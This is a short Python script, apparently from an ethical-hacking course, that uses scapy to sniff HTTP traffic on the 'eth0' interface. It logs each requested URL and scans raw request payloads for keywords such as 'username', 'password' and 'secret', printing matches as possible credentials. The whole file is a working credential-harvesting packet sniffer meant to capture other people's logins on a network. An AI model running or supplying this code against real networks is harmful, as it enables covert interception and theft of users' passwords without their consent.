#!/usr/bin/env python
import scapy.all as scapy
# to sniff http packet pip install scapy_http
# and import http
from scapy.layers import http

def sniff(interface):
    # prn is the callback function which reads every packet of the interface we want to sniff
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

    # the callback function

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        # print(packet[scapy.YOURLAYER].YOURFIELD)
        # print(packet[scapy.Raw].load)
        # convert byte object to string to follow python3 requirents
        load = str((packet[scapy.Raw].load))
        keywords = ["uname", "username", "user", "login", "login_name", "txtUsername", "password", "pass", "secret",
                    "txtPassword"]
        for key in keywords:
            if key in load:
                return load
                #print("\n\n[+] Possible username/password > " + load + "\n\n")
                # break to run iterate the list one time
                #break


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show)
        # this is how to concatenate two strings , see the format at the bottom notes
        url = get_url(packet)
        # convert byte object to string to follow python3 requirements
        # print("[+] HTTP Request >> " + str(url))
        # OR  USE your_var.decode()
        print("[+] HTTP Request >> " + url.decode())

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")






sniff("eth0")


# with packet.show(you can determine the fields of a layer you want to filter example row and HTTPrequest)
# print(packet.show())
# print(packet)

#SOS SOS SOS #
# EXAMPLE
# print(packet[scapy.YOURLAYER].YOURFIELD)
# print(packet[scapy.Raw].load)
